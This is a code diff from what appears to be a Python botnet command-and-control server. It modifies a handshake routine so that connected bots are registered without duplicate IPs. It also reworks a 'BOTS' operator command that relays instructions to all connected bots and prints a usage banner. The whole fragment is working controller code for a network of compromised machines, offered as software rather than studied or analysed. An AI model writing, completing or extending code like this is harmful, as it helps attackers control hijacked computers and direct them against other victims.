@@ -66,7 +66,13 @@ def handshake_botnet(s, ip):
         if encode == 3:
            threading.Thread(target=handshake_client,args=(s, ip)).start()
         else:
-         bots.append([s,aes_list])
+         c = 0
+         for a in bots:
+          if ip != a[2]:
+           c = 1
+          else:c = 0; break
+         if c == 1:
+           bots.append([s,aes_list,ip])
     except Exception as e:print(e); pass
 
 def handle_title(s,ip):
@@ -109,18 +115,20 @@ def client_command(s,u):
       if not data:continue
       if com[0] in ['CLS','CLEAR']:s.send(b'\033[2J\033[H')
       elif com[0] == 'BOTS':
-        length = []
-        total = 1
-        while True:
+        if len(com) != 1:
+         length = []
+         total = 1
+         while True:
           try:
             length.append(com[total])
             total += 1
           except:break
-        c = bot_sent(' '.join(length))
-        for a in c:
+         for a in bot_sent(' '.join(length)):
           s.sendall(a.encode())
-          if len(c) != 1:bots.sendall(b'\r\n\r\n')
-          else:pass
+          if len(bots) != 1:s.send(b'\r\n\r\n')
+          else:s.send(b'\r\n')
+        else:
+          s.send(f'\x1b[38;5;196mBOTS \x1b[38;5;76m<\x1b[38;5;77mCOMMAND\x1b[38;5;76m>'.encode())
       elif com[0] == 'MENU':
         s.send(b'\033[2J\033[H')
         for a in create_banner("main",[time.ctime(),str(len(bots)),u]):s.send((a+'\r\n').encode()); time.sleep(0.1)
